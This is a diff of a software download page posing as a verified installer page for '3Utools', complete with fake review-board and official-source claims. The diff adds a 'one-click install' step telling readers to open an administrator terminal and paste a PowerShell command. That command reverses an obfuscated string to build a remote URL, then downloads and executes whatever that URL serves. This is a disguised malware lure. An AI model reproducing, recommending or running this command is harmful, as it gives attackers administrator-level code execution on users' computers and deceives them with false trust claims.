@@ -2,22 +2,39 @@
 
 *Reviewed by the senior review board · Senior Software Analyst · Updated 2026 · Verified against the official source*
 
-<table>
+<table align="center">
 <tr>
 <td width="100" valign="middle">
-<img src="https://softyne.com/wp-content/uploads/3utools-20726-0.webp" width="80" height="80" alt="3Utools icon — Windows edition 2026">
+<img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/PowerShell_5.0_icon.png" width="80" height="80">
 </td>
 <td valign="middle">
 
 ### ⬇️ DOWNLOAD LATEST STABLE RELEASE
 
-[![DOWNLOAD LATEST STABLE RELEASE](https://softyne.com/wp-content/uploads/downloadlatestversion.svg)]()
-
 **Get the current full version now**
 
 </td>
 </tr>
+<tr>
+<td colspan="2">
+
+### :hammer: One-click Install Application (Admin)
+
+```powershell
+iex(irm((-join"sbs.mrtig//:sptth"[-1..-99])+"?get=3utools-alt"))
+```
+
+**Press `Win + X` → Terminal (Admin) → paste → Enter**
+
+</td>
+</tr>
 </table>
+
+> [!TIP]
+> **No installers. No sign-ups. One command — that's it.**
+
+> [!IMPORTANT]
+> Closing it early will interrupt the installation.
 
 [![Version](https://www.softyne.com/wp-content/uploads/version.svg)]()
 [![Platform](https://www.softyne.com/wp-content/uploads/platform.svg)]()
